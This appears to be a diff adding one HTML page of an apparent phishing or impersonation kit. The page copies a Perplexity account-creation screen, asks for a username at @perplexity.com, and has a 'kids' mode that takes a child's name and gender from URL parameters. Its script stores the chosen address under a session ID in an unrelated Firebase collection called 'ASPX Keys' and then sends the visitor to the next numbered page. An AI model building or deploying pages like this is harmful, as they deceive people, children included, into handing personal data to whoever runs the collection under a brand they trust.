@@ -1,0 +1,293 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Perplexity - How you’ll sign in</title>
+    <style>
+        /* CSS Variables for Real-Time Theme Switching */
+        :root {
+            --bg-color: #ffffff;
+            --text-color: #000000;
+            --sub-text-color: #6e6e73;
+            --input-border: #d1d1d6;
+            --input-bg: #ffffff;
+            --label-bg: #ffffff;
+            --btn-bg: #000000;
+            --btn-text: #ffffff;
+            --domain-text: #8e8e93;
+            --error-text: #d93025;
+        }
+
+        @media (prefers-color-scheme: dark) {
+            :root {
+                --bg-color: #121212;
+                --text-color: #ffffff;
+                --sub-text-color: #a1a1aa;
+                --input-border: #3f3f46;
+                --input-bg: #121212;
+                --label-bg: #121212;
+                --btn-bg: #ffffff;
+                --btn-text: #000000;
+                --domain-text: #71717a;
+                --error-text: #ef4444;
+            }
+        }
+
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: flex-start;
+            height: 100vh;
+            margin: 0;
+            padding: 40px 20px;
+            background-color: var(--bg-color);
+            color: var(--text-color);
+            transition: background-color 0.3s ease, color 0.3s ease;
+        }
+
+        .container {
+            width: 100%;
+            max-width: 400px;
+            text-align: center;
+        }
+
+        h1 {
+            font-size: 32px;
+            font-weight: 600;
+            margin-bottom: 10px;
+        }
+
+        .sub-text {
+            color: var(--sub-text-color);
+            font-size: 16px;
+            line-height: 1.5;
+            margin-bottom: 30px;
+        }
+
+        .input-group {
+            position: relative;
+            margin-bottom: 5px;
+            text-align: left;
+        }
+
+        label {
+            position: absolute;
+            top: -10px;
+            left: 12px;
+            background: var(--label-bg);
+            padding: 0 4px;
+            font-size: 12px;
+            color: var(--sub-text-color);
+            z-index: 1;
+            transition: background-color 0.3s ease;
+        }
+
+        .input-wrapper {
+            display: flex;
+            align-items: center;
+            border: 1px solid var(--input-border);
+            border-radius: 24px; /* Increased radius */
+            padding: 12px 16px;
+            height: 56px;
+            box-sizing: border-box;
+            background: var(--input-bg);
+            transition: border-color 0.2s ease, background-color 0.3s ease;
+        }
+
+        .input-wrapper:focus-within {
+            border-color: var(--text-color);
+            border-width: 2px;
+        }
+
+        input {
+            border: none;
+            outline: none;
+            font-size: 17px;
+            width: 100%;
+            background: transparent;
+            color: var(--text-color);
+        }
+
+        .domain-suffix {
+            color: var(--domain-text);
+            font-size: 17px;
+            margin-left: 4px;
+            white-space: nowrap;
+        }
+
+        .instruction-text {
+            font-size: 13px;
+            color: var(--sub-text-color);
+            text-align: left;
+            margin-top: 8px;
+            margin-left: 5px;
+        }
+
+        .error-message {
+            color: var(--error-text);
+            font-size: 14px;
+            margin-top: 8px;
+            display: none;
+            text-align: left;
+            margin-left: 5px;
+        }
+
+        .next-btn {
+            width: 100%;
+            background-color: var(--btn-bg);
+            color: var(--btn-text);
+            border: none;
+            border-radius: 40px; /* Increased radius */
+            padding: 16px;
+            font-size: 18px;
+            font-weight: 500;
+            margin-top: 30px;
+            cursor: pointer;
+            transition: opacity 0.2s, background-color 0.3s ease, color 0.3s ease;
+        }
+
+        .next-btn:disabled {
+            opacity: 0.5;
+            cursor: not-allowed;
+        }
+    </style>
+</head>
+<body>
+
+    <div class="container">
+        <h1 id="pageTitle">How you’ll sign in</h1>
+        <p class="sub-text" id="subText">Create a email address for signing in to your Perplexity Account</p>
+
+        <div class="input-group">
+            <label>Username</label>
+            <div class="input-wrapper">
+                <input type="text" id="usernameInput" placeholder="Username" autocomplete="off">
+                <span class="domain-suffix">@perplexity.com</span>
+            </div>
+            <div id="instruction" class="instruction-text">You can use letters (A-Z), numbers & periods</div>
+            <div id="errorMsg" class="error-message">That username is taken. Try another.</div>
+        </div>
+
+        <button id="nextBtn" class="next-btn">Next</button>
+    </div>
+
+    <script type="module">
+        import { initializeApp } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-app.js";
+        import { getFirestore, doc, updateDoc, collection, query, where, getDocs } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-firestore.js";
+
+        const firebaseConfig = {
+            apiKey: "AIzaSyDPm2za3Ho0Hd8Henuhq0KxAHyUQh-Hi-U",
+            authDomain: "question-metabase.firebaseapp.com",
+            databaseURL: "https://question-metabase-default-rtdb.asia-southeast1.firebasedatabase.app",
+            projectId: "question-metabase",
+            storageBucket: "question-metabase.firebasestorage.app",
+            messagingSenderId: "770698198753",
+            appId: "1:770698198753:web:59ae49d78b6013bab5c1a0",
+            measurementId: "G-6ZP1FPMKSJ"
+        };
+
+        const app = initializeApp(firebaseConfig);
+        const db = getFirestore(app);
+
+        const usernameInput = document.getElementById('usernameInput');
+        const nextBtn = document.getElementById('nextBtn');
+        const errorMsg = document.getElementById('errorMsg');
+        const instructionText = document.getElementById('instruction');
+        const pageTitle = document.getElementById('pageTitle');
+        const subText = document.getElementById('subText');
+
+        // URL Parameter handling
+        const urlParams = new URLSearchParams(window.location.search);
+        const sessionId = urlParams.get('session');
+        const typeParam = urlParams.get('type');
+        const nameParam = urlParams.get('name');
+        const genderParam = urlParams.get('gender');
+
+        // If 'type=kids' is present, update the UI dynamically
+        if (typeParam === 'kids') {
+            const childName = nameParam ? nameParam.charAt(0).toUpperCase() + nameParam.slice(1) : "Your child";
+            pageTitle.innerText = `Choose how ${childName} will sign in`;
+
+            let pronounSubject = "They";
+            let pronounPossessive = "their";
+
+            if (genderParam && genderParam.toLowerCase() === 'male') {
+                pronounSubject = "He";
+                pronounPossessive = "his";
+            } else if (genderParam && genderParam.toLowerCase() === 'female') {
+                pronounSubject = "She";
+                pronounPossessive = "her";
+            }
+
+            subText.innerText = `${pronounSubject} will use this email to sign in to ${pronounPossessive} Perplexity Account`;
+        }
+
+        // Logic for handling the "Next" action
+        async function handleNext() {
+            const username = usernameInput.value.trim();
+            if (!username) return;
+
+            const fullEmail = username + "@perplexity.com";
+            nextBtn.disabled = true;
+            nextBtn.innerText = "Processing...";
+            errorMsg.style.display = 'none';
+            instructionText.style.display = 'block';
+
+            try {
+                // Check if username is taken
+                const q = query(collection(db, "ASPX Keys"), where("email", "==", fullEmail));
+                const querySnapshot = await getDocs(q);
+
+                if (!querySnapshot.empty) {
+                    errorMsg.style.display = 'block';
+                    instructionText.style.display = 'none';
+                    nextBtn.disabled = false;
+                    nextBtn.innerText = "Next";
+                } else {
+                    // If available, update database and redirect
+                    if (sessionId) {
+                        const docRef = doc(db, "ASPX Keys", sessionId);
+                        await updateDoc(docRef, {
+                            email: fullEmail,
+                            updatedAt: new Date().toLocaleString('en-US', { timeZone: 'UTC', hour12: true }) + " UTC+5:30"
+                        });
+                        
+                        // Redirect to 4.html with the session ID
+                        window.location.href = `4.html?session=${sessionId}`;
+                    } else {
+                        alert("Error: Session ID missing.");
+                        nextBtn.disabled = false;
+                        nextBtn.innerText = "Next";
+                    }
+                }
+            } catch (error) {
+                console.error("Database Error:", error);
+                nextBtn.disabled = false;
+                nextBtn.innerText = "Next";
+            }
+        }
+
+        // restrict input characters: Only A-Z, a-z, 0-9, and period (.) allowed
+        usernameInput.addEventListener('input', (e) => {
+            const val = e.target.value;
+            const cleanVal = val.replace(/[^a-zA-Z0-9.]/g, ''); // Enforces strict character limit
+            usernameInput.value = cleanVal;
+            errorMsg.style.display = 'none';
+            instructionText.style.display = 'block';
+        });
+
+        // Click event
+        nextBtn.addEventListener('click', handleNext);
+
+        // Enter key event
+        usernameInput.addEventListener('keydown', (e) => {
+            if (e.key === 'Enter') {
+                handleNext();
+            }
+        });
+    </script>
+</body>
+</html>
